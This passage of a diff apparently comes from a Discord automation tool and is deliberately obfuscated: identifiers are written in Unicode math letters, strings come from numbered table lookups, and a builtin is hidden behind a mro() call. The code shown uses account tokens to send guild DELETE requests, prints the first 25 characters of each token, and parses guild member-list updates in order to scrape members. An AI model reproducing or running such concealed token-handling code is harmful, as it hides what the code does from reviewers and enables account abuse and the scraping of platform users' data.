-                                return 𝗿𝗲𝙨𝙥𝘰𝗻𝙨𝘦.json().get(𝗡𝘔𝗠𝘔𝘕𝘭𝙡𝘔𝙈𝙡𝘔𝗠𝗡𝙡𝙄𝗠𝗜𝙄𝙉𝗠𝘐𝙄𝗠𝗜𝗹𝗜𝙉𝘐𝘔𝙄𝙄𝘔[160])
+                                return 𝘳𝗲𝘴𝘱𝙤𝘯𝙨𝙚.json().get(𝘐𝘕𝙄𝗡𝙡𝗹𝗜𝘔𝘐𝘐𝗹𝙈𝘭𝙡𝙄𝙡𝙡𝗡𝘕𝘐𝗹𝘭𝙈𝙉𝗹𝘕𝘭𝗠𝙄𝘔𝘐𝗠[153])
                             except:
-                                return 𝙜𝙪𝘪𝗹𝘥
-                if not 𝘪𝗻_𝙜𝘂𝙞𝙡𝘥:
-                    return 𝙜𝘂𝘪𝙡𝙙
-            𝘀𝘦𝘵𝗮𝘁𝙩𝗿(𝘴𝘦𝗹𝘧, 'guild', 𝙜𝙚𝘵_𝗴𝘶𝙞𝗹𝙙_𝘯𝗮𝗺𝘦(𝘨𝘂𝗶𝗹𝗱))
-            𝘱𝘢𝘺𝘭𝘰𝘢𝙙 = {𝗡𝘔𝗠𝙈𝘕𝙡𝘭𝙈𝙈𝘭𝗠𝘔𝙉𝘭𝙄𝗠𝙄𝗜𝗡𝘔𝘐𝙄𝘔𝗜𝘭𝙄𝙉𝗜𝗠𝙄𝙄𝙈[161]: False}
-            𝘳𝘦𝙨𝗽𝘰𝙣𝘀𝘦 = 𝘀𝘦𝘴𝙨𝘪𝗼𝙣.delete(f'{𝘕𝗠𝙈𝙈𝙉𝗹𝗹𝙈𝗠𝙡𝘔𝗠𝙉𝙡𝗜𝘔𝘐𝘐𝙉𝙈𝗜𝗜𝘔𝗜𝗹𝙄𝙉𝙄𝗠𝙄𝘐𝗠[162]}{𝘨𝘶𝘪𝘭𝗱}', json=𝘱𝘢𝙮𝙡𝗼𝙖𝙙, headers=𝘴𝘦𝙡𝘧.headers(𝙩𝙤𝘬𝘦𝗻))
-            match 𝗿𝗲𝙨𝗽𝗼𝘯𝘴𝗲.status_code:
+                                return 𝗴𝙪𝘪𝙡𝗱
+                if not 𝘪𝗻_𝘨𝘂𝙞𝗹𝘥:
+                    return 𝘨𝙪𝗶𝗹𝗱
+            𝘀𝘦𝘵𝘢𝘵𝘁𝙧(𝘴𝙚𝗹𝘧, 'guild', 𝙜𝗲𝘁_𝘨𝙪𝙞𝙡𝗱_𝙣𝗮𝗺𝗲(𝗴𝙪𝙞𝘭𝗱))
+            𝙥𝘢𝘺𝘭𝗼𝘢𝘥 = {𝘐𝘕𝙄𝙉𝗹𝘭𝘐𝘔𝗜𝘐𝗹𝙈𝗹𝘭𝘐𝘭𝗹𝘕𝗡𝘐𝘭𝙡𝗠𝙉𝙡𝙉𝗹𝗠𝙄𝗠𝘐𝘔[154]: False}
+            𝗿𝗲𝘀𝗽𝘰𝙣𝙨𝘦 = 𝙨𝙚𝙨𝙨𝗶𝙤𝙣.delete(f'{𝘐𝗡𝙄𝘕𝙡𝙡𝘐𝗠𝙄𝘐𝗹𝙈𝙡𝙡𝘐𝘭𝙡𝘕𝙉𝗜𝙡𝙡𝗠𝘕𝙡𝗡𝗹𝘔𝘐𝙈𝙄𝗠[155]}{𝘨𝘂𝙞𝗹𝗱}', json=𝗽𝘢𝘆𝙡𝙤𝗮𝗱, headers=𝘀𝗲𝗹𝗳.headers(𝘵𝙤𝙠𝗲𝙣))
+            match 𝘳𝙚𝙨𝙥𝙤𝗻𝘴𝙚.status_code:
                 case 204:
-                    𝘱𝗿𝗶𝗻𝘁(f'{𝙉𝘔𝙈𝙈𝙉𝘭𝙡𝙈𝗠𝗹𝙈𝗠𝘕𝗹𝗜𝗠𝘐𝙄𝘕𝙈𝙄𝙄𝗠𝗜𝗹𝘐𝙉𝙄𝘔𝘐𝗜𝘔[98]}{𝘭𝙘}{𝙉𝙈𝙈𝘔𝗡𝗹𝗹𝘔𝙈𝗹𝘔𝗠𝘕𝗹𝘐𝘔𝗜𝙄𝙉𝙈𝗜𝙄𝘔𝗜𝗹𝗜𝗡𝙄𝙈𝗜𝗜𝙈[163]}{𝙧}{𝗡𝗠𝙈𝘔𝗡𝗹𝙡𝙈𝙈𝙡𝙈𝘔𝗡𝘭𝘐𝗠𝙄𝘐𝙉𝗠𝘐𝗜𝙈𝗜𝙡𝙄𝙉𝘐𝘔𝗜𝙄𝙈[164]}', 𝘍𝙤𝗿𝗲.LIGHTGREEN_EX, 𝙩𝗼𝙠𝗲𝗻[:25], 𝗿, 𝘴𝗲𝘭𝗳.guild)
+                    𝗽𝗿𝗶𝗻𝘵(f'{𝘐𝗡𝗜𝙉𝘭𝙡𝗜𝗠𝗜𝙄𝙡𝗠𝘭𝘭𝙄𝗹𝙡𝗡𝗡𝘐𝘭𝗹𝘔𝗡𝘭𝘕𝙡𝗠𝗜𝗠𝘐𝗠[91]}{𝗹𝘤}{𝗜𝘕𝘐𝙉𝘭𝙡𝘐𝗠𝙄𝘐𝘭𝙈𝘭𝙡𝙄𝗹𝙡𝘕𝙉𝗜𝗹𝙡𝙈𝙉𝙡𝗡𝙡𝙈𝗜𝘔𝗜𝗠[156]}{𝗿}{𝗜𝘕𝙄𝘕𝗹𝗹𝗜𝙈𝗜𝙄𝗹𝙈𝘭𝗹𝗜𝘭𝘭𝘕𝗡𝘐𝙡𝙡𝘔𝘕𝘭𝘕𝘭𝘔𝙄𝗠𝘐𝘔[157]}', 𝗙𝙤𝗿𝗲.LIGHTGREEN_EX, 𝘁𝘰𝗸𝗲𝘯[:25], 𝘳, 𝙨𝘦𝗹𝙛.guild)
                 case _:
-                    𝙥𝘳𝗶𝘯𝘵(f'{𝙉𝙈𝘔𝗠𝗡𝘭𝘭𝙈𝘔𝙡𝗠𝙈𝘕𝙡𝙄𝗠𝘐𝗜𝙉𝘔𝗜𝘐𝗠𝙄𝗹𝘐𝘕𝙄𝙈𝙄𝙄𝗠[98]}{𝙡𝗰}{𝗡𝙈𝘔𝘔𝘕𝘭𝙡𝘔𝘔𝘭𝘔𝗠𝗡𝘭𝗜𝗠𝗜𝘐𝘕𝘔𝙄𝘐𝗠𝙄𝙡𝘐𝗡𝘐𝗠𝘐𝘐𝗠[154]}{𝗿}{𝙉𝙈𝗠𝘔𝘕𝗹𝘭𝘔𝘔𝗹𝙈𝘔𝙉𝙡𝙄𝘔𝘐𝙄𝙉𝗠𝗜𝘐𝘔𝙄𝗹𝙄𝗡𝗜𝗠𝘐𝗜𝗠[164]}', 𝗙𝘰𝙧𝗲.LIGHTRED_EX, 𝘵𝙤𝗸𝘦𝗻[:25], 𝘳𝗲𝙨𝘱𝙤𝘯𝘀𝙚.json().get(𝙉𝗠𝙈𝙈𝗡𝘭𝗹𝘔𝘔𝘭𝙈𝙈𝙉𝗹𝗜𝘔𝙄𝘐𝗡𝗠𝗜𝘐𝙈𝘐𝘭𝙄𝘕𝙄𝙈𝘐𝗜𝘔[155]), 𝙧)
-        except 𝗘𝘹𝙘𝗲𝙥𝙩𝙞𝙤𝙣 as e:
-            𝙥𝗿𝘪𝗻𝘁(f'{𝙉𝗠𝗠𝘔𝙉𝙡𝗹𝘔𝙈𝘭𝘔𝗠𝗡𝙡𝗜𝗠𝗜𝗜𝘕𝗠𝙄𝘐𝗠𝙄𝘭𝗜𝗡𝙄𝙈𝙄𝗜𝘔[98]}{𝙡𝘤}{𝗡𝗠𝙈𝗠𝙉𝙡𝗹𝗠𝘔𝗹𝘔𝘔𝘕𝗹𝘐𝗠𝘐𝘐𝘕𝙈𝗜𝙄𝘔𝘐𝙡𝙄𝘕𝙄𝗠𝙄𝙄𝗠[156]}{𝘳}{𝙉𝘔𝘔𝙈𝙉𝘭𝗹𝘔𝘔𝗹𝗠𝗠𝘕𝗹𝘐𝘔𝘐𝙄𝙉𝗠𝙄𝗜𝗠𝗜𝘭𝗜𝘕𝗜𝗠𝘐𝘐𝗠[164]}', 𝙁𝗼𝙧𝙚.LIGHTRED_EX, 𝗿, 𝙩𝗼𝙠𝘦𝘯[:25], 𝗲)
+                    𝘱𝗿𝘪𝗻𝘁(f'{𝘐𝘕𝘐𝙉𝗹𝗹𝙄𝘔𝘐𝗜𝗹𝙈𝙡𝗹𝘐𝙡𝙡𝗡𝗡𝙄𝘭𝘭𝘔𝗡𝙡𝗡𝘭𝘔𝘐𝘔𝗜𝘔[91]}{𝘭𝘤}{𝙄𝘕𝗜𝙉𝘭𝙡𝙄𝗠𝗜𝗜𝗹𝘔𝘭𝗹𝗜𝙡𝙡𝙉𝘕𝗜𝗹𝘭𝙈𝗡𝘭𝙉𝙡𝙈𝙄𝗠𝙄𝗠[147]}{𝘳}{𝙄𝘕𝙄𝘕𝘭𝗹𝗜𝗠𝙄𝗜𝙡𝘔𝘭𝗹𝙄𝘭𝗹𝘕𝘕𝘐𝗹𝘭𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝗠𝘐𝘔[157]}', 𝙁𝘰𝘳𝗲.LIGHTRED_EX, 𝘵𝙤𝙠𝙚𝙣[:25], 𝙧𝙚𝘴𝘱𝙤𝗻𝘴𝙚.json().get(𝘐𝗡𝘐𝘕𝗹𝙡𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝘭𝗜𝙡𝙡𝗡𝗡𝗜𝗹𝙡𝗠𝗡𝗹𝙉𝗹𝗠𝘐𝘔𝙄𝘔[148]), 𝘳)
+        except 𝗘𝘹𝘤𝗲𝗽𝘁𝗶𝗼𝘯 as e:
+            𝗽𝗿𝙞𝘯𝘁(f'{𝙄𝗡𝘐𝘕𝙡𝙡𝘐𝙈𝙄𝘐𝗹𝘔𝗹𝗹𝗜𝘭𝗹𝗡𝘕𝘐𝘭𝘭𝙈𝗡𝗹𝙉𝗹𝙈𝗜𝘔𝗜𝙈[91]}{𝘭𝙘}{𝘐𝘕𝙄𝗡𝘭𝙡𝙄𝗠𝙄𝘐𝗹𝙈𝘭𝗹𝘐𝙡𝗹𝗡𝙉𝗜𝗹𝙡𝗠𝘕𝗹𝙉𝗹𝗠𝙄𝙈𝘐𝘔[149]}{𝙧}{𝙄𝙉𝙄𝗡𝙡𝙡𝗜𝙈𝘐𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝗹𝗡𝙉𝗜𝘭𝘭𝘔𝗡𝙡𝗡𝘭𝙈𝘐𝙈𝙄𝘔[157]}', 𝘍𝙤𝗿𝗲.LIGHTRED_EX, 𝗿, 𝘵𝘰𝘬𝗲𝘯[:25], 𝙚)
 
 class Utils:
 
     def rangeCorrector(ranges):
-        if [0, 99] not in 𝗿𝗮𝙣𝗴𝘦𝘴:
-            𝗿𝘢𝗻𝙜𝘦𝙨.insert(0, [0, 99])
-        return 𝘳𝙖𝘯𝘨𝘦𝘴
+        if [0, 99] not in 𝙧𝙖𝘯𝗴𝗲𝘀:
+            𝙧𝘢𝘯𝘨𝙚𝙨.insert(0, [0, 99])
+        return 𝘳𝗮𝗻𝙜𝗲𝘴
 
     def getRanges(index, multiplier, memberCount):
-        𝙞𝙣𝙞𝙩𝗶𝘢𝙡𝗡𝘶𝗺 = 𝙏𝘵𝙘𝘋𝘟𝙬64𝘽𝘄𝙊1𝘪𝘉𝙏𝙠𝘨𝗖𝘍𝙈𝙀𝗰𝘚𝙮𝘔𝙣𝗥𝙅_𝘁𝗤𝘟.mro()[5](𝙞𝙣𝙙𝙚𝘅 * 𝙢𝙪𝙡𝘁𝙞𝙥𝙡𝘪𝘦𝗿)
-        𝘳𝘢𝗻𝙜𝘦𝘴𝙇𝗶𝘴𝙩 = [[𝗶𝗻𝘪𝘁𝙞𝙖𝘭𝙉𝘶𝙢, 𝘪𝗻𝗶𝘵𝘪𝗮𝗹𝗡𝘶𝙢 + 99]]
-        if 𝗺𝘦𝙢𝗯𝘦𝗿𝘊𝘰𝙪𝙣𝙩 > 𝘪𝗻𝗶𝙩𝙞𝗮𝘭𝘕𝙪𝙢 + 99:
-            𝙧𝙖𝗻𝗴𝘦𝘀𝘓𝗶𝘴𝘵.append([𝘪𝙣𝘪𝘵𝗶𝗮𝘭𝙉𝙪𝗺 + 100, 𝘪𝙣𝙞𝘁𝙞𝙖𝘭𝙉𝘂𝗺 + 199])
-        return 𝘜𝘁𝘪𝘭𝙨.rangeCorrector(𝗿𝗮𝗻𝙜𝘦𝘀𝗟𝘪𝘴𝙩)
+        𝙞𝙣𝙞𝘁𝙞𝗮𝗹𝘕𝘶𝗺 = 𝗼𝘎𝘋𝘙𝘻𝙚𝘉𝙁𝘛6𝗳𝗨𝙞𝗮5𝙏𝙄𝗗𝘵𝗕0𝗱6𝗢𝘲𝗞𝘜𝙧𝘍𝘈𝙂𝙮.mro()[6](𝘪𝘯𝙙𝙚𝙭 * 𝙢𝙪𝙡𝘵𝗶𝘱𝗹𝗶𝙚𝘳)
+        𝘳𝗮𝗻𝗴𝗲𝘀𝗟𝙞𝘀𝘵 = [[𝗶𝗻𝗶𝙩𝙞𝙖𝘭𝘕𝘂𝗺, 𝗶𝙣𝗶𝙩𝘪𝘢𝘭𝙉𝘂𝙢 + 99]]
+        if 𝗺𝘦𝘮𝘣𝙚𝗿𝗖𝘰𝘂𝙣𝘁 > 𝗶𝗻𝙞𝙩𝗶𝙖𝙡𝙉𝘂𝙢 + 99:
+            𝘳𝘢𝙣𝘨𝗲𝘴𝙇𝙞𝘀𝘵.append([𝗶𝘯𝘪𝘁𝘪𝙖𝘭𝗡𝘶𝘮 + 100, 𝗶𝙣𝗶𝘁𝗶𝗮𝗹𝗡𝙪𝘮 + 199])
+        return 𝙐𝘵𝘪𝘭𝘀.rangeCorrector(𝙧𝘢𝗻𝗴𝘦𝙨𝗟𝗶𝙨𝙩)
 
     def parseGuildMemberListUpdate(response):
-        𝙢𝙚𝙢𝗯𝗲𝙧𝙙𝘢𝙩𝙖 = {𝘕𝗠𝙈𝘔𝗡𝗹𝙡𝘔𝘔𝗹𝘔𝘔𝗡𝙡𝘐𝘔𝘐𝗜𝘕𝘔𝘐𝙄𝗠𝘐𝙡𝙄𝗡𝘐𝙈𝘐𝗜𝙈[165]: 𝗿𝘦𝙨𝗽𝘰𝙣𝙨𝗲[𝘕𝘔𝗠𝙈𝘕𝘭𝘭𝘔𝙈𝙡𝙈𝙈𝙉𝙡𝙄𝘔𝙄𝗜𝗡𝘔𝙄𝗜𝙈𝙄𝘭𝘐𝗡𝗜𝗠𝗜𝘐𝘔[173]][𝘕𝘔𝘔𝗠𝙉𝙡𝗹𝘔𝘔𝗹𝙈𝘔𝙉𝙡𝘐𝘔𝙄𝗜𝙉𝘔𝙄𝘐𝙈𝙄𝗹𝘐𝘕𝘐𝘔𝘐𝙄𝗠[165]], 𝙉𝗠𝙈𝗠𝗡𝘭𝗹𝘔𝙈𝘭𝗠𝘔𝙉𝗹𝗜𝗠𝘐𝘐𝗡𝙈𝗜𝙄𝗠𝗜𝗹𝙄𝘕𝘐𝗠𝘐𝗜𝙈[166]: 𝘳𝗲𝙨𝙥𝗼𝘯𝙨𝙚[𝗡𝗠𝗠𝘔𝙉𝘭𝗹𝙈𝗠𝗹𝙈𝘔𝘕𝘭𝙄𝗠𝙄𝙄𝘕𝘔𝘐𝙄𝗠𝗜𝙡𝘐𝗡𝗜𝗠𝙄𝗜𝘔[173]][𝙉𝙈𝙈𝙈𝗡𝘭𝘭𝗠𝙈𝗹𝘔𝘔𝙉𝙡𝘐𝘔𝙄𝘐𝘕𝙈𝙄𝙄𝙈𝗜𝗹𝘐𝘕𝙄𝙈𝘐𝗜𝘔[166]], 𝗡𝘔𝙈𝘔𝗡𝙡𝙡𝙈𝗠𝗹𝙈𝙈𝙉𝗹𝙄𝗠𝙄𝙄𝗡𝗠𝘐𝗜𝙈𝘐𝙡𝗜𝘕𝘐𝗠𝙄𝗜𝘔[167]: 𝙧𝗲𝘀𝗽𝘰𝘯𝘀𝙚[𝘕𝗠𝘔𝘔𝘕𝘭𝗹𝙈𝗠𝙡𝙈𝗠𝙉𝘭𝘐𝙈𝙄𝙄𝘕𝗠𝘐𝘐𝘔𝗜𝗹𝗜𝙉𝘐𝗠𝘐𝙄𝘔[173]][𝙉𝘔𝘔𝗠𝙉𝗹𝗹𝘔𝙈𝙡𝙈𝙈𝗡𝘭𝘐𝙈𝗜𝗜𝘕𝙈𝗜𝘐𝘔𝙄𝙡𝙄𝘕𝗜𝙈𝗜𝙄𝙈[167]], 𝗡𝘔𝘔𝗠𝘕𝙡𝗹𝗠𝘔𝗹𝗠𝘔𝗡𝗹𝙄𝗠𝘐𝙄𝗡𝘔𝗜𝘐𝗠𝗜𝘭𝗜𝙉𝙄𝗠𝘐𝙄𝙈[168]: 𝘳𝙚𝘴𝘱𝘰𝗻𝘴𝘦[𝘕𝗠𝘔𝘔𝘕𝙡𝘭𝗠𝙈𝙡𝗠𝙈𝘕𝗹𝙄𝘔𝙄𝘐𝘕𝙈𝘐𝘐𝙈𝙄𝙡𝗜𝗡𝘐𝗠𝙄𝗜𝙈[173]][𝙉𝙈𝙈𝘔𝗡𝙡𝙡𝙈𝗠𝙡𝗠𝘔𝗡𝘭𝙄𝙈𝗜𝗜𝘕𝙈𝙄𝘐𝘔𝗜𝙡𝗜𝙉𝙄𝘔𝙄𝗜𝗠[168]], 𝙉𝘔𝘔𝘔𝘕𝗹𝗹𝘔𝘔𝘭𝙈𝘔𝘕𝘭𝙄𝗠𝗜𝗜𝗡𝗠𝗜𝘐𝙈𝘐𝗹𝗜𝘕𝗜𝗠𝘐𝗜𝘔[169]: 𝙧𝙚𝘴𝙥𝙤𝙣𝘴𝙚[𝗡𝘔𝙈𝗠𝘕𝙡𝙡𝘔𝗠𝗹𝘔𝘔𝙉𝗹𝗜𝗠𝙄𝙄𝗡𝗠𝙄𝗜𝗠𝙄𝘭𝙄𝘕𝙄𝙈𝙄𝗜𝘔[173]][𝘕𝙈𝗠𝙈𝘕𝗹𝙡𝙈𝗠𝗹𝙈𝘔𝘕𝗹𝗜𝙈𝙄𝙄𝘕𝗠𝘐𝙄𝙈𝘐𝘭𝘐𝘕𝙄𝘔𝘐𝙄𝘔[174]], 𝙉𝗠𝘔𝘔𝙉𝙡𝗹𝘔𝗠𝙡𝗠𝙈𝙉𝙡𝘐𝘔𝗜𝙄𝘕𝙈𝙄𝘐𝘔𝘐𝘭𝙄𝙉𝘐𝗠𝗜𝙄𝗠[170]: [], 𝘕𝗠𝘔𝗠𝗡𝘭𝗹𝙈𝘔𝙡𝙈𝗠𝙉𝗹𝙄𝗠𝘐𝙄𝙉𝗠𝘐𝗜𝘔𝘐𝘭𝗜𝙉𝗜𝘔𝗜𝘐𝙈[171]: [], 𝘕𝘔𝗠𝙈𝙉𝙡𝘭𝗠𝙈𝗹𝙈𝙈𝘕𝘭𝘐𝙈𝙄𝙄𝙉𝗠𝙄𝘐𝗠𝗜𝘭𝘐𝘕𝗜𝙈𝙄𝙄𝗠[172]: []}
-        for 𝙘𝗵𝘂𝗻𝙠 in 𝘳𝗲𝘴𝗽𝙤𝘯𝘀𝙚[𝘕𝙈𝘔𝘔𝘕𝗹𝗹𝗠𝘔𝗹𝘔𝙈𝘕𝘭𝘐𝗠𝘐𝗜𝙉𝗠𝘐𝘐𝗠𝗜𝙡𝗜𝗡𝙄𝙈𝗜𝗜𝙈[173]][𝙉𝙈𝘔𝗠𝘕𝙡𝘭𝗠𝘔𝘭𝙈𝗠𝘕𝙡𝗜𝗠𝗜𝙄𝗡𝙈𝘐𝘐𝘔𝙄𝗹𝙄𝘕𝘐𝙈𝘐𝗜𝘔[175]]:
-            𝗺𝘦𝙢𝗯𝗲𝘳𝘥𝗮𝙩𝘢[𝘕𝘔𝗠𝘔𝘕𝙡𝗹𝘔𝘔𝘭𝘔𝙈𝙉𝘭𝘐𝙈𝙄𝘐𝘕𝘔𝗜𝗜𝙈𝙄𝙡𝗜𝘕𝘐𝘔𝙄𝘐𝘔[170]].append(𝘤𝗵𝙪𝙣𝗸[𝘕𝙈𝙈𝗠𝘕𝘭𝗹𝙈𝗠𝗹𝗠𝙈𝗡𝘭𝘐𝗠𝙄𝘐𝗡𝙈𝗜𝗜𝘔𝗜𝘭𝘐𝘕𝘐𝘔𝗜𝙄𝘔[176]])
-            if 𝗰𝘩𝙪𝗻𝙠[𝘕𝗠𝘔𝗠𝗡𝘭𝘭𝘔𝘔𝘭𝗠𝙈𝘕𝙡𝙄𝘔𝘐𝗜𝘕𝘔𝘐𝘐𝗠𝙄𝙡𝘐𝗡𝘐𝘔𝙄𝙄𝘔[176]] in (𝘕𝘔𝙈𝙈𝘕𝘭𝙡𝗠𝙈𝗹𝗠𝘔𝘕𝗹𝙄𝙈𝗜𝘐𝘕𝙈𝘐𝗜𝘔𝘐𝘭𝗜𝗡𝗜𝗠𝙄𝘐𝗠[177], 𝙉𝙈𝗠𝗠𝘕𝗹𝗹𝙈𝘔𝘭𝙈𝙈𝙉𝘭𝘐𝙈𝗜𝙄𝙉𝗠𝗜𝗜𝗠𝙄𝗹𝘐𝘕𝗜𝘔𝘐𝘐𝙈[178]):
-                𝙢𝘦𝗺𝗯𝘦𝙧𝙙𝘢𝙩𝙖[𝘕𝙈𝙈𝘔𝘕𝙡𝙡𝗠𝗠𝘭𝗠𝙈𝗡𝘭𝗜𝗠𝙄𝙄𝗡𝗠𝙄𝘐𝗠𝗜𝗹𝗜𝙉𝙄𝗠𝘐𝗜𝙈[171]].append(𝗰𝗵𝘂𝗻𝙠[𝗡𝘔𝙈𝙈𝘕𝙡𝗹𝘔𝗠𝘭𝗠𝗠𝗡𝗹𝘐𝙈𝘐𝙄𝗡𝘔𝘐𝙄𝙈𝗜𝗹𝙄𝙉𝗜𝗠𝙄𝗜𝘔[179]])
-                if 𝘤𝗵𝘶𝘯𝗸[𝙉𝘔𝙈𝘔𝗡𝗹𝘭𝘔𝗠𝗹𝘔𝗠𝙉𝙡𝘐𝗠𝘐𝘐𝗡𝗠𝗜𝙄𝗠𝙄𝗹𝗜𝗡𝗜𝙈𝙄𝘐𝗠[176]] == 𝗡𝙈𝘔𝗠𝙉𝙡𝘭𝙈𝙈𝙡𝙈𝙈𝗡𝘭𝘐𝙈𝗜𝙄𝗡𝗠𝙄𝘐𝘔𝙄𝘭𝙄𝗡𝙄𝗠𝗜𝗜𝗠[177]:
-                    𝘮𝗲𝗺𝘣𝙚𝗿𝗱𝙖𝘁𝘢[𝙉𝘔𝙈𝙈𝗡𝙡𝘭𝗠𝗠𝗹𝙈𝘔𝗡𝗹𝗜𝘔𝗜𝗜𝘕𝘔𝘐𝗜𝗠𝙄𝗹𝙄𝙉𝗜𝙈𝘐𝙄𝙈[172]].append(𝘤𝗵𝙪𝘯𝗸[𝙉𝙈𝙈𝘔𝗡𝙡𝘭𝙈𝘔𝗹𝗠𝙈𝘕𝘭𝗜𝘔𝙄𝘐𝗡𝙈𝙄𝘐𝙈𝘐𝗹𝙄𝘕𝘐𝙈𝗜𝘐𝙈[180]])
+        𝙢𝘦𝗺𝗯𝗲𝗿𝘥𝙖𝙩𝘢 = {𝙄𝗡𝙄𝙉𝘭𝗹𝙄𝙈𝗜𝙄𝘭𝘔𝙡𝘭𝙄𝙡𝙡𝗡𝙉𝗜𝙡𝗹𝘔𝙉𝙡𝗡𝘭𝙈𝙄𝗠𝙄𝗠[158]: 𝙧𝘦𝘀𝙥𝗼𝘯𝘀𝗲[𝙄𝙉𝗜𝙉𝗹𝘭𝘐𝗠𝙄𝗜𝗹𝘔𝘭𝙡𝗜𝙡𝗹𝘕𝘕𝗜𝙡𝗹𝘔𝙉𝗹𝗡𝘭𝗠𝙄𝙈𝘐𝙈[166]][𝘐𝙉𝗜𝘕𝘭𝗹𝗜𝘔𝘐𝗜𝗹𝙈𝘭𝙡𝘐𝘭𝗹𝘕𝗡𝗜𝘭𝗹𝗠𝗡𝘭𝗡𝙡𝙈𝗜𝗠𝙄𝗠[158]], 𝙄𝘕𝗜𝙉𝙡𝘭𝙄𝙈𝗜𝙄𝘭𝘔𝙡𝗹𝗜𝘭𝗹𝗡𝙉𝗜𝘭𝘭𝗠𝘕𝙡𝙉𝗹𝙈𝘐𝙈𝘐𝘔[159]: 𝙧𝘦𝘀𝗽𝙤𝙣𝘴𝗲[𝙄𝙉𝘐𝗡𝙡𝘭𝘐𝙈𝘐𝘐𝗹𝗠𝙡𝗹𝙄𝘭𝙡𝙉𝘕𝗜𝗹𝘭𝘔𝗡𝘭𝘕𝘭𝗠𝘐𝙈𝙄𝘔[166]][𝙄𝗡𝗜𝙉𝗹𝗹𝗜𝗠𝗜𝗜𝗹𝙈𝙡𝙡𝗜𝘭𝗹𝙉𝙉𝙄𝘭𝘭𝗠𝘕𝙡𝙉𝙡𝘔𝗜𝗠𝗜𝗠[159]], 𝙄𝙉𝗜𝙉𝘭𝗹𝙄𝘔𝗜𝙄𝙡𝗠𝘭𝘭𝗜𝘭𝗹𝗡𝗡𝗜𝘭𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝙄𝙈𝘐𝗠[160]: 𝘳𝗲𝘀𝗽𝗼𝙣𝙨𝙚[𝗜𝙉𝙄𝘕𝙡𝗹𝘐𝘔𝘐𝘐𝗹𝘔𝗹𝗹𝙄𝙡𝙡𝗡𝗡𝗜𝙡𝙡𝗠𝗡𝘭𝗡𝗹𝘔𝗜𝗠𝘐𝗠[166]][𝘐𝘕𝘐𝘕𝗹𝙡𝘐𝗠𝘐𝗜𝗹𝙈𝘭𝙡𝗜𝙡𝘭𝗡𝘕𝗜𝘭𝘭𝗠𝘕𝘭𝘕𝗹𝘔𝙄𝘔𝗜𝘔[160]], 𝗜𝗡𝗜𝗡𝗹𝙡𝘐𝙈𝘐𝗜𝘭𝘔𝙡𝘭𝘐𝙡𝗹𝙉𝘕𝙄𝘭𝙡𝙈𝘕𝘭𝘕𝗹𝙈𝘐𝘔𝙄𝘔[161]: 𝗿𝘦𝘀𝘱𝗼𝘯𝙨𝗲[𝗜𝘕𝘐𝗡𝗹𝘭𝙄𝙈𝙄𝘐𝙡𝙈𝙡𝗹𝘐𝗹𝙡𝗡𝙉𝘐𝙡𝙡𝙈𝙉𝘭𝗡𝙡𝙈𝗜𝗠𝗜𝙈[166]][𝗜𝙉𝗜𝙉𝘭𝙡𝗜𝙈𝙄𝘐𝘭𝙈𝙡𝘭𝙄𝘭𝗹𝗡𝙉𝙄𝗹𝘭𝘔𝙉𝗹𝙉𝗹𝙈𝗜𝙈𝗜𝙈[161]], 𝗜𝗡𝙄𝗡𝙡𝗹𝗜𝙈𝗜𝘐𝙡𝙈𝙡𝗹𝙄𝙡𝙡𝗡𝙉𝗜𝙡𝙡𝗠𝗡𝗹𝗡𝗹𝙈𝘐𝘔𝘐𝘔[162]: 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝘦[𝗜𝘕𝘐𝘕𝗹𝘭𝗜𝗠𝘐𝙄𝘭𝙈𝗹𝘭𝙄𝙡𝘭𝗡𝘕𝘐𝗹𝘭𝙈𝙉𝘭𝗡𝙡𝗠𝘐𝘔𝘐𝙈[166]][𝙄𝙉𝙄𝘕𝘭𝗹𝘐𝙈𝙄𝙄𝙡𝙈𝘭𝙡𝗜𝘭𝙡𝘕𝘕𝘐𝗹𝙡𝗠𝗡𝘭𝘕𝘭𝘔𝙄𝙈𝙄𝗠[167]], 𝘐𝗡𝙄𝗡𝘭𝗹𝗜𝗠𝘐𝗜𝘭𝘔𝙡𝘭𝘐𝘭𝘭𝘕𝗡𝙄𝗹𝘭𝘔𝘕𝙡𝘕𝘭𝗠𝗜𝙈𝗜𝙈[163]: [], 𝘐𝘕𝙄𝗡𝘭𝘭𝗜𝙈𝘐𝙄𝗹𝘔𝘭𝙡𝘐𝙡𝘭𝙉𝘕𝙄𝙡𝘭𝙈𝘕𝙡𝗡𝗹𝗠𝙄𝙈𝙄𝗠[164]: [], 𝗜𝘕𝘐𝘕𝙡𝘭𝘐𝗠𝗜𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝙡𝙉𝙉𝙄𝙡𝗹𝙈𝙉𝘭𝗡𝙡𝗠𝙄𝙈𝙄𝙈[165]: []}
+        for 𝗰𝙝𝘂𝗻𝘬 in 𝗿𝙚𝙨𝙥𝗼𝗻𝘴𝗲[𝗜𝘕𝗜𝘕𝙡𝘭𝗜𝙈𝙄𝙄𝗹𝗠𝙡𝙡𝘐𝙡𝗹𝗡𝘕𝘐𝙡𝘭𝘔𝗡𝘭𝙉𝗹𝘔𝙄𝙈𝗜𝗠[166]][𝙄𝙉𝘐𝗡𝘭𝘭𝙄𝗠𝘐𝗜𝘭𝘔𝘭𝗹𝙄𝘭𝙡𝙉𝗡𝙄𝗹𝙡𝘔𝘕𝗹𝗡𝙡𝘔𝘐𝗠𝘐𝘔[168]]:
+            𝗺𝗲𝗺𝘣𝗲𝘳𝗱𝗮𝘁𝘢[𝘐𝘕𝗜𝙉𝙡𝙡𝙄𝗠𝙄𝙄𝘭𝙈𝗹𝗹𝗜𝙡𝘭𝙉𝗡𝙄𝙡𝙡𝗠𝙉𝘭𝙉𝗹𝗠𝘐𝙈𝙄𝙈[163]].append(𝘤𝘩𝘂𝘯𝘬[𝘐𝙉𝗜𝙉𝙡𝙡𝘐𝗠𝘐𝙄𝙡𝗠𝗹𝗹𝗜𝗹𝘭𝘕𝘕𝗜𝗹𝙡𝗠𝗡𝙡𝗡𝗹𝙈𝗜𝗠𝘐𝗠[169]])
